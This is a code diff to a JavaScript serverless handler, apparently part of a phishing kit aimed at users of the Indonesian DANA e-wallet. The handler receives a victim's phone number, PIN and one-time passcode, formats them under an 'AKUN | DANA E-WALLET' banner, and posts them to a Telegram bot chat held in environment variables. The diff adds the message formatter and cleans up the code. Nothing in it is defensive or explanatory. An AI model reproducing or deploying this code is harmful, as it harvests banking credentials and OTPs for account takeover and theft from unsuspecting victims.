@@ -1,36 +1,57 @@
 const axios = require('axios');
 
-exports.handler = async (event) => {
+// Format pesan Telegram
+function formatMessage(type, phone, pin, otp) {
+  const formattedPhone = phone.replace(/(\d{3})(\d{4})(\d{3,4})/, '$1-$2-$3');
+  
+  let message = 
+    "├• AKUN | DANA E-WALLET\n" +
+    "├───────────────────\n" +
+    `├• NO HP : ${formattedPhone}\n`;
+
+  if (pin) {
+    message += "├───────────────────\n" +
+               `├• PIN  : ${pin}\n`;
+  }
+
+  if (otp) {
+    message += "├───────────────────\n" +
+               `├• OTP : ${otp}\n`;
+  }
+
+  message += "╰───────────────────";
+  return message;
+}
+
+exports.handler = async (event, context) => {
   if (event.httpMethod !== 'POST') {
     return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
   try {
     const { type, phone, pin, otp } = JSON.parse(event.body);
-    
-    // Validasi lebih ketat
+
     if (!type || !phone || phone.length < 10) {
-      return { 
-        statusCode: 400, 
-        body: JSON.stringify({ error: 'Nomor HP tidak valid' }) 
+      return {
+        statusCode: 400,
+        body: JSON.stringify({ error: 'Nomor HP tidak valid' })
       };
     }
 
-    // Pastikan variabel lingkungan ada
-    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
       throw new Error('Telegram configuration missing');
     }
 
     const message = formatMessage(type, phone, pin, otp);
-    
-    await axios.post(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      }
-    );
+
+    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    });
 
     return {
       statusCode: 200,
@@ -40,9 +61,9 @@ exports.handler = async (event) => {
   } catch (error) {
     return {
       statusCode: 500,
-      body: JSON.stringify({ 
+      body: JSON.stringify({
         error: 'Internal Server Error',
-        details: error.message 
+        details: error.message
       })
     };
   }
